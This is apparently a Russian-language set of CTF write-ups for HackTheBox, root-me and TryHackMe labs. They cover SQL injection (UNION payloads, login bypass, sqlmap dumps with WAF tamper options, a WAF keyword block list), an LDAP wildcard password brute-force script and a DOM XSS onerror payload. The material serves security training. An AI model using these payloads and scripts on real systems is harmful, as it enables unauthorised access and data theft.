Ааа, в этой лаборатории 2 столбца. То есть увеличиваем количество столбцов в `order by` до тех пор пока не получим ошибку, если получим ошибку, значит мы уже задали максимальный идекс столбца.

**Второй способ оперделния количество столбцов**

Суть заключается в том чтобы отправить `UNION` с параметром `NULL` до тех пор пока не исчезнет ошибка:

```sql
'UNION SELECT NULL--
'UNION SELECT NULL,NULL--
'UNION SELECT NULL,NULL,NULL --
```

**Определите типы данных столбцов.**

```sql
'UNION SELECT 'a', NULL --  
'UNION SELECT NULL, 'a' --  
'UNION SELECT 'a','a'--
```

Значит оба столбца имеют текстовое поле. Что же у нас получается? Мы должны использовать `UNION SELECT` чтобы вывести данные из таблицы `dual` у которого два столбца.

- Посмотрите на оператор Oracle Select. Исходя из источника, ему нужен `from DUAL`.

```sql
'UNION SELECT 'PAYLOAD' , 'PAYLOAD' FROM DUAL--
```

И так, запрос корректно обрабатывается, значит всё хорошо. Но наша задача вывести версию базы данных Oracle

```sql
SELECT banner FROM v$version
```

Всё бы ничего но мы пропустили условию - основной запрос использует таблицу `dual` который в свою очередь имеет две колонки. Оператор `UNION` используется для объединения результатов двух или более запросов. Для успешного выполнения объединения, запросы должны возвращать одинаковое количество столбцов с совместимыми типами данных. Если основной запрос возвращает два столбца, то и подзапрос с `UNION` должен возвращать два столбца.

Предположим, что исходный запрос выглядит следующим образом:


```sql
SELECT id, username FROM users;
```

Этот запрос выбирает два столбца: id и username. 

**Соответствие количеству столбцов**

Чтобы добавить информацию о версии базы данных из представления v$version с помощью оператора UNION, подзапрос также должен возвращать два столбца. Например:

```sql
UNION SELECT banner, NULL FROM v$version;
```

Здесь:

- banner — столбец, который содержит информацию о версии базы данных.
- NULL — используется как заполнитель (placeholder) для второго столбца.

**Пример выполнения объединенного запроса**

Комбинированный запрос может выглядеть следующим образом:
```sql
SELECT id, username FROM users
UNION
SELECT banner, NULL FROM v$version;
```

Так что полезная нагрузка будет выглядит вот так:

```sql
'UNION SELECT banner, NULL FROM v$version--
```

![[Pasted image 20240711085549.png]]

При создание полезнйо нагрузке знак + используется для объединения частей строки в одно целое. Например, если это URL-запрос, то пробелы в URL-кодировке часто заменяются на +. Таким образом, в контексте URL символ + представляет собой пробел. В зависимости от контекста (например, формирование URL для SQL-инъекции), + используется вместо пробелов для правильной передачи строки.

## 0xBOverchunked

**Платформа:** https://hackthebox.com
**Уровень:** Easy

**Описание задания: Сможете ли вы получить шестой символ из базы данных?**

Исходный код задачи можно скачать здесь → [https://app.hackthebox.com/challenges/0xBOverchunked](https://app.hackthebox.com/challenges/0xBOverchunked)

Структура приложения:

```
.
├── 0xBOverchunked.zip
├── build_docker.sh
├── challenge
│   ├── assets
│   │   ├── images
│   │   │   ├── bg.png
│   │   │   ├── game-boy8bit.png
│   │   │   └── posts
│   │   │       ├── 1.png
│   │   │       ├── 2.png
│   │   │       ├── 3.png
│   │   │       ├── 4.png
│   │   │       └── 5.png
│   │   └── styles
│   │       └── style.css
│   ├── Controllers
│   │   ├── Database
│   │   │   ├── Connect.php
│   │   │   └── Cursor.php
│   │   ├── Handlers
│   │   │   └── SearchHandler.php
│   │   └── WAF
│   │       └── waf.php
│   ├── db
│   │   └── init.sql
│   └── index.php
├── conf
│   ├── httpd.conf
│   └── supervisord.conf
└── Dockerfile

12 directories, 19 files
```

Скачав исходный код и разархивировав его, давайте его проанализируем.

![[Pasted image 20240314002237.png]]

Поиск по идентификаторам кажется интересной функцией.

Поиграйтесь с панелью поиска и узнайте, как она работает, а затем проверьте ее на наличие уязвимостей.

При навигации по файлам, если вы посмотрите на Cursor.php, вы увидите две функции unsafequery и Safequery. Функция unsafequery, которая принимает аргументы $pdo, $id и выполняет ее внутри SQL-запроса, не существует подготовленного оператора, кроме безопасного запроса. функция принимает те же аргументы и выполняет ее внутри запроса SQL, но в подготовленном операторе.

Примечание. Если вы не знаете, что такое подготовленный оператор, вы можете прочитать об этом здесь → [_https://www.w3schools.com/php/php_mysql_prepared_statements.asp ._](https://www.w3schools.com/php/php_mysql_prepared_statements.asp)

```php
<?php
require_once 'Connect.php';

function safequery($pdo, $id)
{
    if ($id == 6)
    {
        die("You are not allowed to view this post!");
    }

    $stmt = $pdo->prepare("SELECT id, gamename, gamedesc, image FROM posts  WHERE id = ?");
    $stmt->execute([$id]);

    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    return $result;
}

function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}

?>
```

Затем, если мы решим внедрить SQL, вы получите следующее сообщение:

![[Pasted image 20240314002359.png]]

Похоже, используется WAF (на самом деле вы это уже знаете из файла waf.php :D)

Пройдемся по **waf.php**:

```php
<?php
function waf_sql_injection($input)
{
    $sql_keywords = array(
        'SELECT',
        'INSERT',
        'UPDATE',
        'DELETE',
        'UNION',
        'DROP',
        'TRUNCATE',
        'ALTER',
        'CREATE',
        'FROM',
        'WHERE',
        'GROUP BY',
        'HAVING',
        'ORDER BY',
        'LIMIT',
        'OFFSET',
        'JOIN',
        'ON',
        'SET',
        'VALUES',
        'INDEX',
        'KEY',
        'PRIMARY',
        'FOREIGN',
        'REFERENCES',
        'TABLE',
        'VIEW',
        'AND',
        'OR',
        "'",
        '"',
        "')",
        '-- -',
        '#',
        '--',
        '-'
    );

    foreach ($sql_keywords as $keyword)
    {
        if (stripos($input, $keyword) !== false)
        {
            return false;
        }
    }
    return true;
}

?>
```

Цикл foreach ищет любые ключевые слова SQL во входных данных поиска и очищает их. Выглядит очень ограничительным WAF.

Но как нам обойти этот WAF и добраться до функции unsafequery?

Анализируя **SearchHandler.php,** мы увидим этот оператор if.

```php
if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];

    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }

}
```

Этот оператор if ищет заголовок Transfer-Encoding с фрагментированным значением (нет, он не имеет ничего общего с контрабандой HTTP-запросов).

Если мы включим заголовок Transfer-Encoding: Chunked в наш запрос, мы достигнем функции unsafequery и внедрим некоторый SQL.

**Давайте возьмем флаг**

Запрос, который я использовал:

```
POST /Controllers/Handlers/SearchHandler.php HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 8
Origin: http://host/
Connection: close
Referer: http://host/
Transfer-Encoding: chunked

search=1
```

Затем запустите sqlmap по этому запросу:

Изменить: это база данных SQLite, вы можете увидеть ее в файле **Connect.php** . (Спасибо « [Жолт Хорват](https://medium.com/@hzsolt12) »)

```php
<?php
$dbFile = '/opt/app/db/chunked.db';

try
{
    $pdo = new PDO("sqlite:$dbFile"); // SQLite DB
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
}
catch(PDOException $e)
{
    die("Failed to connect to database: " . $e->getMessage());
}
?>
```

Запускаем sqlmap:

```bash
sqlmap -r request --risk=3 --level=5 --dbms=sqlite --ignore-code=500 --dump -T posts --threads 10
```

- sqlmap: название инструмента для проведения атак на базы данных через SQL-инъекции.
- -r request: указывает на файл с запросом, который будет использоваться для атаки.
- --risk=3: уровень риска, который определяет, насколько далеко инструмент будет идти в попытках обнаружить уязвимости (от 1 до 3).
- --level=5: уровень агрессивности, который определяет количество тестовых запросов, отправляемых на сервер для обнаружения уязвимостей (от 1 до 5).
- --dbms=sqlite: указывает на то, что целевая база данных является SQLite.
- --ignore-code=500: игнорирует ошибки сервера с кодом 500 (внутренняя ошибка сервера).
- --dump: указывает на необходимость извлечения данных из базы данных.
- -T posts: указывает на таблицу "posts", из которой необходимо извлечь данные.
- --threads 10: количество потоков, которые будут использоваться для выполнения атаки.

sqlmap обнаружит, что это слепая SQL-инъекция:

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=1' AND 1602=1602-- tNrW

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: search=1' AND 9040=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- xaaq
---
web application technology: Apache
back-end DBMS: SQLite
```

Через несколько минут вы получите флаг.

```
Database: <current>  
Table: posts  
[6 entries]  
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+  
| id | image | gamedesc | gamename |  
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+  
| 1 | 1.png | A small, yellow, mouse-like creature with a lightning bolt-shaped tail. Pikachu is one of the most popular and recognizable characters from the Pokemon franchise. | Pikachu |  
| 2 | 2.png | Pac-Man is a classic arcade game where you control a yellow character and navigate through a maze, eating dots and avoiding ghosts. | Pac-Man |  
| 3 | 3.png | He is a blue anthropomorphic hedgehog who is known for his incredible speed and his ability to run faster than the speed of sound. | Sonic |  
| 4 | 4.png | Its me, Mario, an Italian plumber who must save Princess Toadstool from the evil Bowser. | Super Mario |  
| 5 | 5.png | Donkey Kong is known for his incredible strength, agility, and his ability to swing from vines and barrels. | Donkey Kong |  
| 6 | 6.png | HTB{f4k3_fl4_f0r_t35t1ng} | Flag |  
+----+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
```

Поздравляем!

![[Pasted image 20240314002957.png]]


---
## SQL injection - authentication

**Платформа:** https://www.root-me.org/
**Уровень:** Easy

Сегодня разберём задачу "SQL injection - authentication".

![[Pasted image 20230108200532.png]]

Первое задание на SQL-инъекции, одна из самых распространённых уязвимостей в веб-приложениях. Данное задание является одним из самых простых примеров SQLi в форме аутентификации. 

Для того, чтобы иметь базовые представления об SQLi, рекомендую прочитать наши старые посты про уязвимости веб-риложений:

- [Анализ безопасности веб-приложений. Основы.](https://tgraph.io/Atakuem-veb-prilozheniya-Osnovy-06-19)
- [Анализ безопасности веб-приложений. Настройка Burp Suite.](https://tgraph.io/Burp-Suite---udobnyj-instrument-dlya-provedeniya-atak-na-veb-prilozheniya-06-20)
- [SQLi, часть1 - Теория.](https://tgraph.io/Atakuem-veb-prilozheniya-Uyazvimost-SQLi-CHast-1---Teoriya-06-23)
- [SQLi, часть 2 - Практика.](https://tgraph.io/Atakuem-veb-prilozheniya-Uyazvimost-SQLi-CHast-2---Praktika-06-24)

Если вам не хватит данного материала, вы можете также самостоятельно поискать информацию в сети. Тема SQLi хорошо описана и имеет множество простых объяснений работы и примеров. Это во многом связано с тем, что данная уязвимость довольно проста на начальных этапах, а точнее методы её эксплуатации.

Начнём задание, перейдя по ссылке.

![[Pasted image 20230108201024.png]]

Исходного кода нет, но мы ведь знаем, что здесь есть SQLi. Для удобства будем отправлять запросы через Burp Suite.

Для начала отправим просто кавычку, с целью вызвать ошибку SQL синтаксиса.

![[Pasted image 20230108201054.png]]

Странно, но никакого видимого изменения ответа не последовало, попробуем указать любой пароль, предполагая, что запрос с пустым паролем просто не обрабатывается.

![[Pasted image 20230108201112.png]]

Получаем ошибку, отлично. Теперь попробуем сделать стандартный обход авторизации использую комментирование.

Смысл данного метода заключается в том, что мы отбрасываем проверку пароля с помощью комментирования оставшегося запроса, в котором происходит проверка пароля. Запрос может иметь примерно следующий вид:
`
```sql
SELECT * FROM users WHERE username='$user_name' and password = '$password' 
```

Таким образом встраивая в код : ' -- ' в имя пользователя мы отбросим проверку пароля, т.к. последовательность символов -- является комментарием в SQL.

Попробуем передать строку ' -- '. При этом укажем перед ней имя пользователя "admin", т.к. нам надо получить пароль для него.

![[Pasted image 20230108201247.png]]

Отлично, инъекция проходит и мы заходим из под админа и нам выдаёт username и password для этого аккаунта.
Используем полученный пароль для сдачи задания. Задание решено. 

Это один из самых простых примеров SQLi и сейчас его встретить очень сложно, разве что на старых сайтах или у совсем неопытных разработчиков, которые используют небезопасные запросы к БД.

---
## Someone stole Santa's gift list!


**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

В разделе «Вызовы» мы привели примечание, в котором говорится:

«TODO Санты: Посмотрите на альтернативные системы баз данных, которые лучше sqlite. Также не забывайте, что вы установили брандмауэр веб-приложений (WAF) после прошлогодней атаки. Если вы забыли команду, вы можете указать SQLMap попытаться обойти WAF, используя — tamper=space2comment»

И так сначала переходим на 80 порт, но страница не открывается. Когда мы заходим на IP через браузер, он говорит: 

![[Pasted image 20240801015944.png]]

Браузер не может подключиться. Но это странно, потому что если мы попробуем проверить это с помощью `ping`команды, сервер даст нам ответ как обычно. Достаточно странно? Давайте сделаем сканирование портов:

```
nmap 10.10.211.76  
Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-01 00:13 MSK  
Nmap scan report for 10.10.211.76  
Host is up (0.16s latency).  
Not shown: 997 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
22/tcp   open  ssh  
3000/tcp open  ppp  
8000/tcp open  http-alt  
  
Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds
```

Хм, сервер запущен на 8000 порту. Переходим по этому порту

![[Pasted image 20240801001651.png]]

Как указано выше, веб-сайт использует СУБД SQLite, а WAF работает на сервере. Нам нужно найти секретную страницу входа Санты без перебора. Проверьте исходный код на наличие комментариев.  Полезных комментариев нет, а подсказка подсказывает /s**tap***l. Так что это должно быть /santapanel.

**Вопрос №1 Какова секретная панель входа в систему Санты, если не использовать перебор каталогов?**

Для вопроса № 1 я просто предположил, основываясь на подсказке. Это можно было бы сделать с помощью чего-то вроде GoBuster, но там указано, что никакой брутфорс не допускается.

**Ответ: /santapanel**


**Вопрос №3 Сколько записей в базе данных подарков?**

Отсюда мы видим секретную панель входа Санты.

![[Pasted image 20240801002025.png]]

Если мы добавим только одинарную кавычку ', мы получим ошибку SQL, это хорошо.

![[Pasted image 20240801004420.png]]

Нам нужно использовать SQL-инъекцию для обхода.Какой SQLi приходит вам на ум первым…

```
‘or ‘1’=‘1’--
```

В приведенном выше примере мы добавляем условие «Истина» после OR и комментируем оставшуюся часть запроса. Это означает, что запрос не будет проверять правильность введенного пароля.

Разработчик не приложил много усилий для проверки и очистки пользовательского ввода, поэтому мы можем ввести это непосредственно в поле имени пользователя без использования BurpSuite.

![[Pasted image 20240801004800.png]]

Тут имя пользователя santa, а пароль не проверяется. Или можем так:

![[Pasted image 20240801004902.png]]

Имя пользователя Badboi, а значение пароля TRUE.  Но не суть, главное мы обошли систему и вошли в систему как Санта. Это перенаправит вас на новую страницу, где вы сможете просмотреть базу данных. Здесь у нас есть поле поиска, которое показывает результаты в виде таблицы. Поле ищет введенную строку в столбце Подарок.

![[Pasted image 20240801005133.png]]

Если мы введем « ' » в поле поиска, то получим ошибку «нераспознанный токен: «'»», что означает, что это поле также подвержено SQLi. Попробуйте выполнить тот же запрос, что и выше, и мы получим список подарков. Теперь мы знаем, что просил Paul.

![[Pasted image 20240801010424.png]]
**Ответ: 22**

Операция 'ORDER BY' даст нам 2 столбца в этом случае (подтверждено просто вводом '1' в поиск по, индекс/идентификатор для строки).
![[Pasted image 20240801010942.png]]

Так или иначе, просто поэкспериментировав (использовав примеры команд SQLi), мне удалось извлечь базу данных пользователей.

![[Pasted image 20240801011004.png]]

Вернемся к вопросам: «Сколько записей в базе данных подарков?»

```
'UNION SELECT * FROM users--
```

Это не было моей целью, но я восприму это как ответ на наши вопросы. Не ожидал, что таблица будет называться «пользователи» для подарков..

![[Pasted image 20240801011205.png]]

Я не хотел считать все эти строки, я бы сбился со счета на пальцах... вставил данные в текстовый документ и использовал

```
#wc -l gifts.txt
```

В любом случае, мы ответили не по порядку, и это оставляет нас с вопросом: Что такое флаг? Итак, с чего начать? Поскольку нам нужны и другие таблицы, для этого мы будем использовать sqlmap и BurpSuite. Захватите поисковый запрос и сохраните его в файл.

![[Pasted image 20240801011552.png]]

 Также в подсказке упоминается, что просто используйте это, чтобы сбросить всю базу данных.

```
sqlmap -r sqlreq
```

В первый раз вернулся ни с чем. Я забыл, что там упоминалось, что в этом году они установили WAF. Нам нужно использовать опцию:

```
--tamper=space2comment
```

Веб-сайт, используемый для справки: [https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)

Полная команда, используемая для sqlmap:

```
sqlmap -r sqlreq --tamper=space2comment --dbms=sqlite --tables
```

Это дает нам это, когда мы перечисляем таблицы:

```
Database: SQLite_masterdb  
[3 tables]  
+--------------+  
| hidden_table |  
| sequels |  
| users |  
+--------------+
```

Давайте заглянем внутрь таблиц…

```
sqlmap -r day5sqlreq --tamper=space2comment --dbms=sqlite -T <TABLE_NAME> -dumpDatabase: SQLite_masterdb  
Table: users  
[1 entry]  
+------------------+----------+  
| password         | username |  
+------------------+----------+  
| EhCNSWzzFP6sc7gB | admin    |  
+------------------+----------+  
Database: SQLite_masterdb  
Table: sequels  
[22 entries]  
+-------------+-----+----------------------------+  
| kid         | age | title                      |  
+-------------+-----+----------------------------+  
| James       | 8   | shoes                      |  
| John        | 4   | skateboard                 |  
| Robert      | 17  | iphone                     |  
| Michael     | 5   | playstation                |  
| William     | 6   | xbox                       |  
| David       | 6   | candy                      |  
| Richard     | 9   | books                      |  
| Joseph      | 7   | socks                      |  
| Thomas      | 10  | 10 McDonalds meals         |  
| Charles     | 3   | toy car                    |  
| Christopher | 8   | air hockey table           |  
| Daniel      | 12  | lego star wars             |  
| Matthew     | 15  | bike                       |  
| Anthony     | 3   | table tennis               |  
| Donald      | 4   | fazer chocolate            |  
| Mark        | 17  | wii                        |  
| Paul        | 9   | github ownership           |  
| James       | 8   | finnish-english dictionary |  
| Steven      | 11  | laptop                     |  
| Andrew      | 16  | rasberry pie               |  
| Kenneth     | 19  | TryHackMe Sub              |  
| Joshua      | 12  | chair                      |  
+-------------+-----+----------------------------+Database: SQLite_masterdb  
Table: hidden_table  
[1 entry]  
+-----------------------------------------+  
| flag                                    |  
+-----------------------------------------+  
| thmfox{FLAG}                            |  
+-----------------------------------------+
```

**Вопрос №3 Сколько записей в базе данных подарков?**
**Ответ: 22**

**Вопрос №4 О чем просил Paul?**
**Ответ: github ownership**

**Вопрос №5  Что такое флаг?**
**Ответ: Флаг находится в «hidden_table», но поскольку мы сделали дамп всей базы данных, он был сохранен вместе с ним.**

![[Pasted image 20240801013631.png]]

**Вопрос №6 Какой пароль администратора?**

![[Pasted image 20240801013646.png]]



Пример запросов для захвата флага:

![[Pasted image 20240801012548.png]]

Помните, что Санта использует брандмауэр веб-приложений, поэтому вы видите эту часть команды « _tamper ». Кроме того, Санта упоминает, что он хочет обновиться с sqlite, так что вы можете предположить, что это то, с чем мы работаем._

```
sqlmap -r req --tamper=space2comment --dbms=SQLite --tables
```

- -r REQUESTFILE — Загрузить HTTP-запрос из файла  
- -tamper=TAMPER — Использовать заданные скрипты для подделки данных инъекции  
- -dbms=DBMS — Принудительно использовать внутреннюю СУБД для указанного значения  
- -tables — Перечислить таблицы базы данных СУБД

![[Pasted image 20240801014225.png]]

Мы нашли 3 таблицы hidden_table,sequels,users. Чтобы выгрузить данные всех таблиц:

```
sqlmap -r req --tamper=space2comment --dbms=SQLite --dump
```

- --dump — Дамп всех записей таблиц базы данных СУБД

Таблица пользователей содержит пароль администратора, а hidden_table содержит флаг.  Итак, мы нашли ответы на все вопросы.

Да, флаг сверху снят... как всегда, нужно поработать.. В общем, это было неприятно, но весело, узнал немного о Burp и SQLmap, всегда старался избегать этого инструмента, насколько я помню, его нельзя использовать на экзамене OSCP, но это чертовски крутой инструмент, это точно. В любом случае, удачи.

**Manual Mode**

Использование sqlmap было хорошим и простым способом решения этой проблемы, но мне было любопытно, как это можно решить вручную. Я видел, что другие также интересовались каналом AoC2 Discord, поэтому я решил попробовать и поделиться возможным решением.

Начнем с самого начала, чтобы дать полное пошаговое руководство к заданию 5-го дня, вот страница, с которой нам следует начать:

![[Pasted image 20240802033845.png]]

На самом деле в исходном коде страницы особо нечего смотреть, но поскольку в задании говорится о поиске «секретной панели входа Санты и обходе входа», мы можем сделать несколько обоснованных предположений (как указано в первом вопросе задания), чтобы найти панель по адресу /santapanel:

![[Pasted image 20240802033917.png]]

Простой и классический SQLi позволяет нам:

```sql
'or 1=1--
```


![[Pasted image 20240802034003.png]]

Чтобы заранее посмотреть, к какой информации у нас есть доступ, мы можем получить все выходные данные, связанные с кнопкой поиска, попробовав подстановочный знак:
![[Pasted image 20240802034027.png]]

Что касается вектора инъекции, один из предоставленных ресурсов для этого испытания включает [список общих полезных нагрузок](https://github.com/payloadbox/sql-injection-payload-list) , которые мы можем попробовать. Вот одна строка, которая выдает сообщение об ошибке:

![[Pasted image 20240802034129.png]]

Похоже, это сработает, нам просто нужно внести небольшую корректировку, поскольку у нас есть 2 выходных столбца:


```sql
'Badboi' UNION SELECT 1, 2--`
```

![[Pasted image 20240802034229.png]]

- Теперь нам нужно использовать эту уязвимость, чтобы узнать, какие таблицы находятся в базе данных. У нас была подсказка в тексте задания:

```sql
Santa's TODO: Look at alternative database systems that are better than sqlite.
```

Исходя из этого, мы можем предположить, что SQLite — это работающая база данных. Поиск некоторых полезных нагрузок, которые мы можем адаптировать, упрощается благодаря [другому ресурсу, представленному в описании задачи](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) . Немного переработаем синтаксис полезной нагрузки _«Целочисленные/Строковые — Извлечь имя таблицы» :_

```sql
Badboi' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

![[Pasted image 20240802034351.png]]

А затем делаем то же самое с полезной нагрузкой для обнаружения столбцов:

```sql
BadBoi' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--
```

![[Pasted image 20240802034444.png]]

Сделав это для каждой таблицы, мы можем вывести содержимое деталей, которые хотим увидеть:

```sql
BadBoi' UNION SELECT 1, username FROM users--
```

![[Pasted image 20240802034522.png]]

```sql
BadBoi' UNION SELECT 1, password FROM users--
```

![[Pasted image 20240802034616.png]]

Более целенаправленно, что могло бы быть полезно в других ситуациях:

```sql
BadBoi' UNION ALL SELECT NULL, password FROM users WHERE username LIKE 'Admin' --
```

![[Pasted image 20240802034646.png]]

или

```sql
BadBoi' UNION SELECT 1, kid FROM sequels WHERE title LIKE '%Try%' --
```

![[Pasted image 20240802034800.png]]

и в случае с вызовом мы также хотим конкретно:

```sql
BadBoi' UNION SELECT 1, flag FROM hidden_table --
```

![[Pasted image 20240802034830.png]]

Стоило потратить дополнительное время на решение задачи таким образом, и я определенно ценю sqlmap за всю его автоматизацию и за то, как он теперь гораздо лучше форматирует данные.

---


# LDAP injection

## PhoneBook

**Платформа:** https://hackthebox.com
**Уровень:** Easy

При посещении IP-адреса нас встречает страница входа и некоторая информация о пользователе рабочей станции по имени Reese.

![[Pasted image 20230703020952.png]]


Поскольку меня встречает страница входа в систему, я довольно долго пробовал свою удачу с sqli, но это не дало никаких результатов. Все мои входы были встречены с `Authentication failed`.

![[Pasted image 20230703022805.png]]

Во-первых, я вижу страницу входа. Через некоторое время, проверив SQLi, я обнаружил, что разработчики используют подстановочные знаки SQL, и символ «*» мне подходит. Я ввел «*» в оба поля имени пользователя и пароля, затем я получил страницу поиска…

![[Pasted image 20230703024808.png]]

Затем я много раз пытался неправильно войти в систему, но меня не заблокировали (нет ограничения скорости на уязвимости формы).

С символом «*» и «Без ограничения скорости на форме» я решил написать инструменты-скрипты для перебора имени пользователя и пароля.

После небольшой навигации по сайту я смог обойти страницу входа, как упоминалось ранее, но это привело мне нигде. Обходной путь, который я нашел, был прост: исходный код импортирует файлы CSS и JS из другого источника, что привлек мое внимание, и я решил посетить. Единственное, чем мне была полезна эта страница, так это то, что я знал, каким будет ожидаемый контент, как только мы попадем на эту страницу. и это пригодится позже, когда мы автоматизируем эксплойт.

Когда я вернулся на страницу входа, чтобы начать спамить некоторые SQL-запросы, я заметил некоторые странности при использовании `*`. Потратив пару часов на кроличьи норы SQL, я в конце концов наткнулся на [LDAP-инъекцию](https://www.invicti.com/blog/web-security/ldap-injection-how-to-prevent/) , которая и является настоящей уязвимостью.

Этот тип уязвимости работает так же, как и другие инъекции — доверяя и используя непроверенные входные данные. я подтвердил это было так, просто войдите в систему с помощью `*:*`комбинация пользователя/пароля, которая в основном соответствует всем пользователям и обеспечивает действительный сеанс. Хотя у меня нет доступа к исходному коду, такие инъекции обычно выглядят где-то в коде так: `filterContent = "(&(userID=" + enteredUser + ")(password=" + enteredPwd + "))"`.

В случае необходимости обрабатывать вредоносную полезную нагрузку, которая становится `(&(userID="*")(password="*")`, который является всеобъемлющий запрос, это, по сути, позволяет вам войти, потому что он соответствует всем пользователям - `*`является известным подстановочным знаком и имеет законный варианты использования, но определенно не этот.

Однако смягчение последствий простое: дезинфицируйте и отбрасывайте запросы, содержащие ключевые слова, которые могут быть используется для неправильного поведения запроса (не только `*`но также круглые скобки, квадратные скобки, восклицательные знаки и несколько другие). С другой стороны, к сожалению, нет готовых операторов, как в SQL.


Сначала я должен сделать для имени пользователя с помощью первого инструмента-скрипта:

![[Pasted image 20230703024828.png]]

Хорошо, у меня есть имя пользователя… **_«rEesE»._**

![[Pasted image 20230703024841.png]]

![[Pasted image 20230703024848.png]]

Продолжить для пароля найденного имени пользователя…

![[Pasted image 20230703024907.png]]

Ага! Пароль также ФЛАГ для этой задачи!

![[Pasted image 20230703024924.png]]

Можно использовать другие варианты:

![[Pasted image 20230703025346.png]]


```python
#!/usr/bin/env python3
import requests

from string import ascii_lowercase, ascii_uppercase, digits, punctuation

url = 'http://<login_path>'
login_obj = {"username": "some_val", "password":"*"}
punctuation=[c for c in punctuation if c != "*"] # we do not want double asterisk in the query

result = ""
flag = 1

while flag==1:

    flag=0

    for c in [char for chars in [ascii_lowercase, ascii_uppercase, punctuation] for char in chars]:

        login_obj["username"] = result + c + "*"
        req = requests.post(url, data=login_obj)
        req.raise_for_status()

        if("No search results" in req.text): # this text came in the next page after log in.
        
            flag=1
            result += c
            print(result)
            break

print("finish")
```


**Кроме того, я также нашел еще одну ошибку** . Когда я не могу войти в систему, я получаю сообщение на странице входа. Это сообщение получается из параметра «сообщение» в URL-адресе.

![[Pasted image 20230703024940.png]]

Я нашел скрипт для этого действия. Это означает, что браузер получает значение параметра «сообщение», а затем изменяет HTML-содержимое элемента `<form>` с идентификатором = «сообщение», чтобы отображать сообщение на странице. Следовательно, я могу выполнить атаку DOM XSS.

И я попытался внедрить полезную нагрузку xss для создания события «onerror» при загрузке недопустимого изображения. Почему я выбрал <img> вместо `<script>`? `innerHTML` раковина не принимает `script` элементы в любом современном браузере и не будут `svg onload`события огонь. Это означает, что вам нужно будет использовать альтернативные элементы, такие как `img` или `iframe`.

Итак, я ввел полезную нагрузку: `<img src ='x' onerror= 'alert(1)'>

Ага!! Это ДОМ XSS :)))

![[Pasted image 20230703025246.png]]

**Вывод**:

Программа сопоставления паролей вызова телефонной книги

На главной странице мы видим сообщение от одного из админов сайта - Риз. также видим сообщение о том, что логин и пароль подходят от рабочей станции.

Погуглив, мы увидим, что символ * может заменять любые символы. Пытаюсь войти под логином Reese и паролем *.

Попадаем на страницу телефонной книги. Теперь задача найти полный пароль Reese.

Пишем программу, которая отправляет POST-запросы на страницу /login с данными username=Reese и выбираем пароль.

Берем по очереди каждый символ из таблицы ASCII, добавляем к нему * и проверяем в POST-запросе. Если у нас редирект на /, то символ правильный. Добавляем к нему следующий по очереди со * в конце и продолжаем выделение до тех пор, пока последним символом не станет } (из условия задачи).

Наслаждаться!

---


---

# [[Personal Knowledge Base/SECTIONS/20. CyberSec/21. CTF/Write-Ups/01. Web/00. PossibleThreats/File Upload/README|File Upload]]


## The Elf Strikes Back!

**Платформа:** https://tryhackme.com/
**Уровень:** Easy
**Комната**: [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2)

_«Мы знаем, что нас взломали, поэтому нам нужен способ защитить себя! Команда разработчиков создала веб-сайт, на который эльфы могут загружать фотографии подозрительных людей, ошивающихся на фабрике, но нам нужно убедиться, что он безопасен, прежде чем мы добавим его в публичную сеть. Пожалуйста, проведите аудит безопасности на новом сервере и убедитесь, что его невозможно взломать!»_

_Вы слушаете инструктаж и принимаете задачу,_ **_нажимая кнопку развертывания, чтобы запустить сервер_** _._

_В нижней части досье находится липкая записка со следующим сообщением:_

> _Для Elf McEager:  
> Вам был присвоен идентификационный номер для аудита системы:_ `ODIzODI5MTNiYmYw`_. Используйте его, чтобы получить доступ к разделу загрузки на сайте.  
> Удачи!_

**Вопрос №1 Какую строку текста необходимо добавить в URL-адрес, чтобы получить доступ к странице загрузки?**

Я начал с того, что зашел на веб-страницу:

![[Pasted image 20240726112528.png]]

Затем я добавил параметр GET, чтобы отразить предоставленный мне идентификатор:

![[Pasted image 20240726112553.png]]

Ответ на вопрос №1: **?id=ODIzODI5MTNiYmYw**

**Вопрос №2 Какие типы файлов принимает сайт?**

На сайте говорится: «Если вы увидите подозрительных людей возле фабрики, сфотографируйте и загрузите фото сюда!» Предположим, вы можете загружать файлы .jpg.

Я создал тестовый файл, чтобы проверить, правда ли это:

![[Pasted image 20240726112622.png]]

